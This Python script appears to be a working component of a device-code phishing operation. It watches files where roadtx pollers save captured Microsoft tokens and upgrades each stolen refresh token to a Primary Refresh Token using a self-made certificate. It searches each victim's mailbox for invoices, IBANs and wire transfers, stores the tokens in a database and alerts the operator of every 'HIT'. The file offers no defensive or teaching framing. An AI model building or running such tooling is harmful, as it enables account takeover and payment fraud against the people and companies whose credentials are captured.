#!/usr/bin/env python3
"""Watch token files written by the roadtx pollers, harvest PRT + inbox, notify.

roadtx gettokens --device-code already polls /token, so this process never
calls /token itself. It only watches tokens/*.json for a non-empty accessToken.
roadtx 1.22.1 has no `mailboxsearch` command, so the same Graph search is done
directly against /me/messages using the acquired token.
"""

import argparse
import base64
import json
import os
import signal
import sys
import time

import psutil
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from dotenv import load_dotenv

HERE = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(HERE, ".env"))

import db  # noqa: E402
import notify  # noqa: E402

TOKENS = os.path.join(HERE, "tokens")
PRT = os.path.join(HERE, "prt")
import shutil  # noqa: E402

R_CANDIDATE = os.path.join(os.path.dirname(sys.executable), "roadtx.exe" if os.name == "nt" else "roadtx")
ROADTX = R_CANDIDATE if os.path.exists(R_CANDIDATE) else (shutil.which("roadtx") or "roadtx")
SEARCH = "invoice OR remittance OR IBAN OR wire"
CONSUMER = ("outlook.com", "hotmail.com")
running = True


def stop(*_):
    global running
    running = False


def chmod600(path):
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass


def read_token(path):
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return None
    return data if data.get("accessToken") else None


def kill_poller(uid):
    for p in psutil.process_iter(["pid", "cmdline"]):
        cmd = " ".join(p.info.get("cmdline") or [])
        if "roadtx" in cmd and f"{uid}.json" in cmd:
            try:
                p.kill()
                print(f"  killed poller pid {p.info['pid']}")
            except psutil.Error:
                pass


def jwt_payload(token):
    try:
        part = token.split(".")[1]
        part += "=" * (-len(part) % 4)
        return json.loads(base64.urlsafe_b64decode(part))
    except Exception:
        return {}


def make_cert(uid):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, uid)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(__import__("datetime").datetime.utcnow())
        .not_valid_after(__import__("datetime").datetime.utcnow() + __import__("datetime").timedelta(days=30))
        .sign(key, hashes.SHA256())
    )
    cert_path = os.path.join(TOKENS, f"{uid}.pem")
    key_path = os.path.join(TOKENS, f"{uid}.key")
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(key_path, "wb") as f:
        f.write(key.private_bytes(
            serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    chmod600(cert_path)
    chmod600(key_path)
    return cert_path, key_path


def request_prt(uid, refresh_token):
    cert, key = make_cert(uid)
    prt_path = os.path.join(PRT, f"{uid}.json")
    cmd = [ROADTX, "prt", "-r", refresh_token, "-f", prt_path, "-c", cert, "-k", key]
    try:
        import subprocess

        p = subprocess.run(cmd, capture_output=True, text=True, timeout=120, cwd=HERE)
        print(f"  prt rc={p.returncode} {p.stdout.strip()[:160]} {p.stderr.strip()[:160]}")
    except Exception as e:
        print(f"  prt failed: {str(e)[:160]}")
        return None
    if os.path.exists(prt_path):
        chmod600(prt_path)
        return prt_path
    return None


def mailbox_search(access_token):
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/messages",
            headers={"Authorization": f"Bearer {access_token}"},
            params={"$search": f'"{SEARCH}"', "$select": "subject", "$top": "50"},
            timeout=30,
        )
        print(f"  graph search HTTP {r.status_code}")
        if r.status_code != 200:
            return []
        out = []
        for m in r.json().get("value", []):
            s = (m.get("subject") or "").strip()
            if s and s not in out:
                out.append(s)
        return out
    except Exception as e:
        print(f"  graph search error: {str(e)[:160]}")
        return []


def process(uid, data):
    email = ""
    access = data["accessToken"]
    refresh = data.get("refreshToken", "")
    payload = jwt_payload(access)
    upn = (
        payload.get("unique_name") or payload.get("preferred_username")
        or payload.get("upn") or payload.get("email") or "unknown"
    )
    domain = upn.split("@")[-1] if "@" in upn else ""
    if "@" in upn and upn != "unknown":
        email = upn
    consumer = any(upn.lower().endswith(c) for c in CONSUMER)
    if consumer:
        print(f"  consumer account: {upn}")

    prt_path = request_prt(uid, refresh) if refresh else None
    if not prt_path:
        db.add_fail(email, "PRT_FAIL", "prt request did not produce a file", domain)

    subjects = mailbox_search(access)
    db.add_hit(domain, email, upn, access, refresh, prt_path or "", "|".join(subjects), consumer)
    print(f"  HIT {upn} subjects={len(subjects)} prt={bool(prt_path)}")
    notify.notify_hit(domain, upn, bool(prt_path), subjects, consumer)
    chmod600(os.path.join(TOKENS, f"{uid}.json"))
    os.replace(
        os.path.join(TOKENS, f"{uid}.json"),
        os.path.join(TOKENS, f"{uid}.json.consumed"),
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--once", action="store_true")
    ap.add_argument("--window", type=int, default=20)
    args = ap.parse_args()
    os.makedirs(TOKENS, exist_ok=True)
    os.makedirs(PRT, exist_ok=True)
    for d in (TOKENS, PRT):
        try:
            os.chmod(d, 0o700)
        except OSError:
            pass
    db.init_db()
    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    first_seen = {}
    print("polling for token files ...")
    while running:
        now = time.time()
        try:
            names = [n for n in os.listdir(TOKENS) if n.endswith(".json")]
        except OSError:
            names = []
        for name in names:
            uid = name[:-5]
            path = os.path.join(TOKENS, name)
            first_seen.setdefault(uid, now)
            data = read_token(path)
            if data:
                try:
                    process(uid, data)
                except Exception as e:
                    db.add_fail("", "PROCESS_FAIL", f"{uid}: {e}")
                    print(f"  process error {uid}: {e}")
                first_seen.pop(uid, None)
                continue
            if now - first_seen[uid] > args.window * 60:
                print(f"  {uid} expired after {args.window}m")
                kill_poller(uid)
                db.add_fail("", "POLL_TIMEOUT", uid)
                os.replace(path, path + ".expired")
                first_seen.pop(uid, None)
        if args.once:
            time.sleep(2)
            if not any(n.endswith(".json") for n in os.listdir(TOKENS)):
                break
        else:
            time.sleep(2)
    print("poll stopped")
    return 0


if __name__ == "__main__":
    sys.exit(main())
